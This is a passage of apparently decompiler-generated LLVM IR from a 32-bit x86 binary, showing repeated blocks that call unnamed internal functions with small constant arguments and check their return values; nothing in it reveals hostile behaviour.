  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_8051d00()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b26.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_8051d00()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_8051c50(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_8051f40(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049044, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
  %v1_8049128 = add i32 %v1_8049124, -16
  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_8051250(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
